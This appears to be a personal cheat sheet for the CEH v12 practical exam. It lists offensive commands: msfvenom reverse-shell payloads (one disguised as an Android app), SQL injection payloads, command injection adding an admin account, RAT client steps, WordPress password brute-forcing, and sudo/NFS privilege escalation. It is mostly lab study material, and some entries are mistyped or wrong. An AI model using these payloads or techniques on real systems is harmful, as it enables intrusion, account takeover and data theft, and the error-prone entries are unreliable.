# ceh_practical_ceh12
all about ceh v12 practical exam, what types of questions, and stuff
## to find hashes,crc value and other stuff use this:
https://emn178.github.io/online-tools/crc32_checksum.html (online tools github)
https://gchq.github.io/CyberChef/  -----cyber chef

1. find the fqdn of domain controller ?
	```bash
        nmap -p 389 --script ldap-rootdse localhost
	or 
	nmap -sV -p 389 localhost
	or smb os discovery nmap script port 445 
	```

PORT NUMBERS:
21 - FTP
22 - SSH
23 - telnet (use - telent ip/website 80 after this type - GET / HTTP/1.0)
25,110,143 - smtp,pop3,imap
80,443,8080,8080 - HTTP,HTTPS
139,445- SMB
334- HTTPS
389- LDAP - ACTIVE DIR.
ldapsearch -H ldap://10.10.79.88 -x -s base namingcontexts (can see domain controller name here)

2049-NFS network file system (mounting). To see the mount share do = showmount -e ip it will show something like /home
	sudo mount -t nfs IP:/home /tmp/mount/ -nolock (to mount the share to our local machine offcourse u need to make a mkdir /tmp/mount)
	
3306-MYSQL
3389- RDP (xfreerdp

#create a apk payload for android 
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.9.121.119 LPORT=4444 -f raw -o mini_hotstar.apk
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.189 LPORT=4444 -f raw ----(for php upload or file inclusion ) add (GIF98) in dvwa high diff... in the first line of code 
msfvenom -p windows/meterpreter/reverse_tcp --platform windwos -a x86 LHOST=10.9.121.119 LPORT=4444 -f exe -o fake.exe

hackable/uploads/ceh_notes
; cp /var/www/html/DVWA/hackable/uploads/shell3.png /var/www/html/DVWA/hackable/uploads/shell3.php




Remote Access Trojan (RAT):::

you will need to access some code text file so do this because it will be in win... open cmd -  dir /b/s "*.txt"
do nmap for open ports all the related ports to mobile like 80,443,8080,8443,5228,5555(5228 is google play store port)
Theef default port: 9871, 6703, FTP 2968
NJRAT default port: 5552 
MoSucker default port: 200005 
ProRat default port: 5110 

ProRat 
Execute ProRat
Set victim IP and relative port 5110 
Click to connect and search files.


Theef  
Execute Theef 
Set victim IP and relative ports to 6703,9871 and 2968 (or custom port) 
Click to connect and open file manger. 


NjRat 
Execute NjRat 
Insert IP and Port (it will attacker's ip and port this time )
Click on manager and open directory




ENTROPY VALUE (USE ent tool --- ent file.txt)



###SQL INJECTION(sqli)

COMMENTS USE IN SQLi
Oracle	      --comment
Microsoft     --comment or /*comment*/
PostgreSQL    --comment or /*comment*/
MySQL	      #comment or -- comment [Note the space after the double dash] or /*comment*/


VERSION USE IN SQLi
Oracle         --- select version from v$instc
Microsoft      --- select @@version
PostreSQL      --- select version()
MySQL          --- select @@version



to login in as random user use below line:
lskdjf' or 1=1 -    ---(remember the space after 1 and if this doesn't work try other payload)

sqli some payload to use
admin' --  
admin' #  
admin'/*  
' or 1=1--  
' or 1=1#  
' or 1=1/*  
') or '1'='1--  
') or ('1'='1—


sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=6jdekes1pn684pit6c16e34n6h; security=low; -dbs   (START FROM THIS THEN YOU'LL GET DATABASES)
 --cookie="PHPSESSID=6jdekes1pn684pit6c16e34n6h; security=low; ui-tabs-1=0" -D moveiscope --tables -dbs  -----(USE LOGGED IN USER OR NOT BUT USE --COOKIE WITH SECRUTIRYS)

with agressive scanning 
sqlmap -u "domain.xyz" --crawl=3 --level=5 --risk=3 --dbs
    OR
use jsql might work

 
 payload
 1' union select null,version(),null# ----simple union one
 1' union select table_name,null from information_schema.tables where table_schema='dvwa'# ----- where table_schema is basically database name dont forget it 
 1' union select column_name, table_name from information_schema.columns where table_name="users"# 
 1' union select user,password from users#
 

###SMB 445 
to see share of smb 
smbclient -L //ip/
to see inside the share 
smbclient //ip/share_name

nmap script named smb-enum-shares (use if other smb tool not working)
nmap smb-vuln* 

smbmap tool to get into smb 
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1 (-d is optional)

Overall Scan - 
enum4linux -a ip


#####WORDPRESS (WPSCAN) AND USER AND PASSWORD ENUMERATION
to enumerate password of the user use metasploit - 
wordpress_login_enum (msfconsole)

wpscan --url http://192.168.1.10:8080/wordpress -u sarah -P passwdlist.txt
wpscan --url http://192.168.1.10:8080/wordpress --enumerate u ---to get usernames



####OPENVAS (https://127.0.0.1:9392/) DEFAULT PORT
to start the service---   sudo gvm-start
to stop  the service---   sudo gvm-stop  

#### NESSUS (https://kali:8834/)


####STEGNOGRAPHY
steghide --embed -sf file.jpg -ef data.txt ---- to add txt file in the image 
steghide --extract -sf file.jpg -----to extract the file 
steghide info file.jp ----to check if it has any file inside the image
stegseek file.jpg rockyou.txt ---- crack the steg image file if password is in the wordlist

and another tool both in win. and linux 
snow and stegsnow
stegsnow -p "root" -m "This is the real harry pass.: lsdkjfdl34re0dkj" pass.txt restricted.txt (restricted is the file which has hidden data)
stegsnow -p "root" restricted.txt 
SAME IN WINDOWS 


SNOW WINDOWS
snow.exe -C -p "password" stegfile.txt 


### wireshark filters

// filters by post
http.request.method==POST --check password or username

to check the ip and how has sent the most and least packets to victim and other things 
tcp.flags.syn==1 and tcp.flags.ack==0 ----this is show you ddos packets go to statictics > ipv4 > ip source & des > check which one you want ip (destination and ports)

ip.dst == 172.22.10.10 (display filter)

Open IPv4 Conversations:
Statistics > Conversations > IPv4 tab.
Sort by Packets:
Click on the Packets column header to sort conversations by packet count.
Identify the least packet count:
Look through the sorted list to find the conversation with the least number of packets sent to 172.22.10.10 .

### Identify IoT Message and its Length:

to filter only publish message and get that only use mqtt.msgtype==3
you'll get only publish messagge
or
Filter .cap file on wireshark with 'MQTT' filter
Select packet related to Publish Message
Click on MQ Telemetry Transport Protocol -> Header Flags -> Message Msg Len 
or

Click on MQ Telemetry Transport Protocol -> Publish Message -> Msg Len



####
http://www.site.com/index.php?page_id=95 (useful to finding pages and flag)
 ####


###### Privilege scalation 
ssh -p 2222 user@1ip
sudo -ls ###list the su permisions

sudo vim -c ':!/bin/sh' ### privilege escalation

	OR
	
Misconfigured NFS (Port 2049)

nmap -sV -p 2049 IP/Subnet
sudo apt-get install nfs-common (IF NOT install)
Enumerate NFS Shares:

nmap -sV --script=nfs-showmount <Target_IP>
Check Available Mounts:

showmount -e <Target_IP>
We will see the /home directory.
Create Directory to Mount NFS Share:

mkdir /tmp/nfs
Mount the NFS Share:

sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
Change to the Mounted Directory:

cd /tmp/nfs
Copy bash to the Mounted Directory:

sudo cp /bin/bash .
Make bash Executable a Setuid Binary:

sudo chmod +s bash
It will be highlighted in red.
Check Permissions and Mounted Filesystems:

ls -la
sudo df -h
In Another Terminal, SSH into the Target Machine:

Execute Setuid bash to Gain Root:

./bash -p
Navigate to the /home Directory:
now check the file if you're root
find / -name "*.txt" -ls 2> /dev/null


####### FOR WINDOWS PRIVILEGE ESCALATION USE
BeRoot tool 




####CRYPTOGRAPHY 
BCTextEncoder
if question says decode the say sniff.txt file then use bctextencoder it will be encoded file don't modify it...
and it will ask for the pass. it will one of the user's pass.




####DVWA (COMMAND INJECTION) -
net user 
net user /Add Test
net localgroup Administrators Test /Add  (granted admin privileges)

commands to use in commands injection
;,&,|,||,$



###FILE UPLOAD
GIF98 (in the first line of payload) this is for high level...save as jpeg or png

#####adb or android 
to check open ports: 5555
more adb port imp is 5555 and others that may use are 5037 ie. adb server then 5555 ie. wireless adb
80/443 use for web services, 22 for ssh,8000 for scrcpy streaming display and 5554-5584 for android emulator.
connect adb to ip:5555
adb shell
adb pull i.e for downloading content locally 
adb push i.e for uploading content locally




